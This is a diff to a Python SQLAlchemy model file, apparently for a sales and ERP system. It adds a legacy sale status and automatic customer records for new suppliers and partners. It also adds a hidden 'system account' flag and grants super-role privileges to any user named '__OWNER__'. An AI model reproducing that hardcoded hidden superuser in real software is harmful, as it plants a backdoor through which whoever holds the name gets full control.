@@ -247,6 +247,7 @@ class PaymentProgress(str, enum.Enum):
 class SaleStatus(str, enum.Enum):
     DRAFT = "DRAFT"
     CONFIRMED = "CONFIRMED"
+    COMPLETED = "completed"  # للتوافق مع البيانات القديمة
     CANCELLED = "CANCELLED"
     REFUNDED = "REFUNDED"
 
@@ -255,6 +256,7 @@ class SaleStatus(str, enum.Enum):
         return {
             "DRAFT": "مسودة",
             "CONFIRMED": "مؤكدة",
+            "completed": "مكتملة",  # للتوافق مع البيانات القديمة
             "CANCELLED": "ملغاة",
             "REFUNDED": "مسترجعة",
         }[self.value]
@@ -263,6 +265,7 @@ class SaleStatus(str, enum.Enum):
 _ALLOWED_SALE_TRANSITIONS = {
     "DRAFT": {"CONFIRMED", "CANCELLED"},
     "CONFIRMED": {"CANCELLED", "REFUNDED"},
+    "completed": {"CANCELLED", "REFUNDED"},  # للتوافق مع البيانات القديمة
     "CANCELLED": set(),
     "REFUNDED": set(),
 }
@@ -1393,6 +1396,7 @@ class User(db.Model, UserMixin, TimestampMixin, AuditMixin):
     password_hash = db.Column(db.String(255), nullable=False)
     role_id = db.Column(db.Integer, db.ForeignKey("roles.id"), index=True)
     is_active = db.Column(db.Boolean, nullable=False, server_default=sa_text("1"))
+    is_system_account = db.Column(db.Boolean, nullable=False, server_default=sa_text("0"), index=True)  # حساب نظام مخفي محمي
     last_login = db.Column(db.DateTime)
     last_seen = db.Column(db.DateTime)
     last_login_ip = db.Column(db.String(64))
@@ -1448,8 +1452,13 @@ class User(db.Model, UserMixin, TimestampMixin, AuditMixin):
         return (getattr(self.role, "name", "") or "").strip().lower()
 
     @property
+    def is_system(self) -> bool:
+        """حساب نظام محمي ومخفي"""
+        return bool(getattr(self, 'is_system_account', False)) or self.username == '__OWNER__'
+    
+    @property
     def is_super_role(self) -> bool:
-        return self.role_name_l in {"developer", "owner", "super_admin"}
+        return self.role_name_l in {"developer", "owner", "super_admin"} or self.is_system
 
     @property
     def is_admin_role(self) -> bool:
@@ -1956,12 +1965,17 @@ class Supplier(db.Model, TimestampMixin, AuditMixin):
     payment_terms = db.Column(db.String(50))
     currency = db.Column(db.String(10), default="ILS", nullable=False, server_default=sa_text("'ILS'"))
     
+    # ربط تلقائي مع جدول العملاء
+    customer_id = db.Column(db.Integer, db.ForeignKey("customers.id"), index=True, nullable=True)
+    
     # حقول الأرشيف
     is_archived = db.Column(db.Boolean, default=False, nullable=False, index=True)
     archived_at = db.Column(db.DateTime, index=True)
     archived_by = db.Column(db.Integer, db.ForeignKey("users.id"), index=True)
     archive_reason = db.Column(db.String(200))
 
+    # العلاقات
+    customer = db.relationship("Customer", foreign_keys=[customer_id], backref="supplier_link")
     payments = db.relationship("Payment", back_populates="supplier")
     invoices = db.relationship("Invoice", back_populates="supplier")
     preorders = db.relationship("PreOrder", back_populates="supplier")
@@ -2125,6 +2139,89 @@ class Supplier(db.Model, TimestampMixin, AuditMixin):
 
     def __repr__(self):
         return f"<Supplier {self.name}>"
+    
+    def ensure_customer_link(self):
+        """إنشاء أو ربط عميل تلقائياً"""
+        if not self.customer_id and self.id:
+            # البحث عن عميل موجود بنفس البيانات
+            existing = Customer.query.filter(
+                (Customer.phone == self.phone) if self.phone else False
+            ).first()
+            
+            if existing:
+                self.customer_id = existing.id
+            else:
+                # إنشاء عميل جديد بنفس الاسم
+                customer = Customer(
+                    name=self.name,  # نفس الاسم بدون إضافات
+                    phone=self.phone or '0000000',
+                    whatsapp=self.phone or '0000000',
+                    email=self.email or f'supplier_{self.id}@system.local',
+                    address=self.address,
+                    currency=self.currency,
+                    credit_limit=0,
+                    notes=f"حساب مرتبط بالمورد #{self.id}"
+                )
+                db.session.add(customer)
+                db.session.flush()
+                self.customer_id = customer.id
+
+
+# Event listener لإنشاء عميل تلقائياً للمورد الجديد
+@event.listens_for(Supplier, "after_insert")  
+def supplier_after_insert_create_customer(mapper, connection, target):
+    """إنشاء عميل تلقائياً بعد إضافة مورد"""
+    if not target.customer_id:
+        from sqlalchemy import insert as sa_insert, select as sa_select, update as sa_update
+        
+        # البحث عن عميل موجود
+        existing_customer_id = None
+        if target.identity_number:
+            result = connection.execute(
+                sa_select(Customer.id).where(Customer.identity_number == target.identity_number)
+            ).first()
+            if result:
+                existing_customer_id = result[0]
+        elif target.phone:
+            result = connection.execute(
+                sa_select(Customer.id).where(Customer.phone == target.phone)
+            ).first()
+            if result:
+                existing_customer_id = result[0]
+        
+        if existing_customer_id:
+            # ربط بالعميل الموجود
+            connection.execute(
+                sa_update(Supplier).where(Supplier.id == target.id).values(customer_id=existing_customer_id)
+            )
+            # تحديث اسم العميل
+            connection.execute(
+                sa_update(Customer).where(Customer.id == existing_customer_id).values(
+                    name=sa_text(f"name || ' (مورد)'")
+                )
+            )
+        else:
+            # إنشاء عميل جديد
+            result = connection.execute(
+                sa_insert(Customer).values(
+                    name=f"{target.name} (مورد)",
+                    identity_number=target.identity_number,
+                    phone=target.phone,
+                    email=target.email,
+                    address=target.address,
+                    currency=target.currency,
+                    credit_limit=0,
+                    current_balance=0,
+                    notes=f"عميل مرتبط بالمورد #{target.id}",
+                    created_at=datetime.utcnow()
+                ).returning(Customer.id)
+            )
+            customer_id = result.scalar_one()
+            
+            # ربط المورد بالعميل
+            connection.execute(
+                sa_update(Supplier).where(Supplier.id == target.id).values(customer_id=customer_id)
+            )
 
 
 @event.listens_for(Supplier, "before_insert")
@@ -2433,12 +2530,17 @@ class Partner(db.Model, TimestampMixin, AuditMixin):
     currency = db.Column(db.String(10), default="ILS", nullable=False, server_default=sa_text("'ILS'"))
     notes = db.Column(db.Text)
     
+    # ربط تلقائي مع جدول العملاء
+    customer_id = db.Column(db.Integer, db.ForeignKey("customers.id"), index=True, nullable=True)
+    
     # حقول الأرشيف
     is_archived = db.Column(db.Boolean, default=False, nullable=False, index=True)
     archived_at = db.Column(db.DateTime, index=True)
     archived_by = db.Column(db.Integer, db.ForeignKey("users.id"), index=True)
     archive_reason = db.Column(db.String(200))
 
+    # العلاقات
+    customer = db.relationship("Customer", foreign_keys=[customer_id], backref="partner_link")
     warehouses = db.relationship("Warehouse", back_populates="partner")
     payments = db.relationship("Payment", back_populates="partner")
     preorders = db.relationship("PreOrder", back_populates="partner")
@@ -2587,8 +2689,80 @@ class Partner(db.Model, TimestampMixin, AuditMixin):
 
     def __repr__(self):
         return f"<Partner {self.name}>"
+    
+    def ensure_customer_link(self):
+        """إنشاء أو ربط عميل تلقائياً"""
+        if not self.customer_id and self.id:
+            # البحث عن عميل موجود بنفس البيانات
+            existing = Customer.query.filter(
+                (Customer.phone == self.phone_number) if self.phone_number else False
+            ).first()
+            
+            if existing:
+                self.customer_id = existing.id
+            else:
+                # إنشاء عميل جديد بنفس الاسم
+                customer = Customer(
+                    name=self.name,  # نفس الاسم بدون إضافات
+                    phone=self.phone_number or '0000000',
+                    whatsapp=self.phone_number or '0000000',
+                    email=self.email or f'partner_{self.id}@system.local',
+                    address=self.address,
+                    currency=self.currency,
+                    credit_limit=0,
+                    notes=f"حساب مرتبط بالشريك #{self.id}"
+                )
+                db.session.add(customer)
+                db.session.flush()
+                self.customer_id = customer.id
 
 
+# Event listener لإنشاء عميل تلقائياً للشريك الجديد
+@event.listens_for(Partner, "after_insert")
+def partner_after_insert_create_customer(mapper, connection, target):
+    """إنشاء عميل تلقائياً بعد إضافة شريك"""
+    if not target.customer_id:
+        from sqlalchemy import insert as sa_insert, select as sa_select, update as sa_update
+        
+        # البحث عن عميل موجود بنفس رقم الهاتف
+        existing_customer_id = None
+        if target.phone_number:
+            result = connection.execute(
+                sa_select(Customer.id).where(Customer.phone == target.phone_number)
+            ).first()
+            if result:
+                existing_customer_id = result[0]
+        
+        if existing_customer_id:
+            # ربط بالعميل الموجود (بدون تغيير اسمه)
+            connection.execute(
+                sa_update(Partner).where(Partner.id == target.id).values(customer_id=existing_customer_id)
+            )
+        else:
+            # إنشاء عميل جديد بنفس الاسم
+            result = connection.execute(
+                sa_insert(Customer).values(
+                    name=target.name,  # نفس الاسم بدون إضافة
+                    phone=target.phone_number or '0000000',
+                    whatsapp=target.phone_number or '0000000',
+                    email=target.email or f'partner_{target.id}@system.local',
+                    address=target.address,
+                    currency=target.currency,
+                    credit_limit=0,
+                    notes=f"حساب مرتبط بالشريك #{target.id}",
+                    created_at=datetime.utcnow(),
+                    is_active=True
+                ).returning(Customer.id)
+            )
+            customer_id = result.scalar_one()
+            
+            # ربط الشريك بالعميل
+            connection.execute(
+                sa_update(Partner).where(Partner.id == target.id).values(customer_id=customer_id)
+            )
+
+
+# ==========================================
 @event.listens_for(Partner, "before_insert")
 def _partner_before_insert(_m, _c, t: Partner):
     t.email = (t.email or "").strip().lower() or None
